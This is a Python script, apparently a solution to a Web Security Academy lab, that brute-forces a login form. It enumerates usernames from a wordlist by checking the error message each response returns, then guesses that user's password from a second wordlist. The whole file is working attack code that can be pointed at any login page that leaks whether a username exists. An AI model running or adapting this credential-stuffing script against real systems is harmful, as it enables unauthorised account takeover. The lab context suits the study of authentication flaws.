import sys
import urllib3
import urllib
import requests

fs = open("Username.txt", "r")
fp = open("Password.txt", "r")

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

def main():
    url = "https://0a68008203013c75c051336800690064.web-security-academy.net/login"
    username = ""
    print("(+) Retrieving username...")
    for x in fs:
        username = x.strip("\n")
        data = {"username": username, "password": "123"}
        r = requests.post(url, data=data)
        if "Invalid username or password." in r.text:
            sys.stdout.write(username)
            sys.stdout.write("\r")
            sys.stdout.flush
        else:
            sys.stdout.write(username + " - correct username\n")
            sys.stdout.flush
            break
    password = ""
    print("(+) Retrieving password...")
    for x in fp:
        password = x.strip("\n")
        data = {"username": username, "password": password}
        r = requests.post(url, data=data)
        # if r.status_code == 200:
        if "Invalid username or password" in r.text:
            sys.stdout.write(password)
            sys.stdout.write("\r")
            sys.stdout.flush
        else:
            sys.stdout.write(password + " - correct password\n")
            sys.stdout.flush
            break
    print("Done!")

if __name__ == "__main__":
    main() 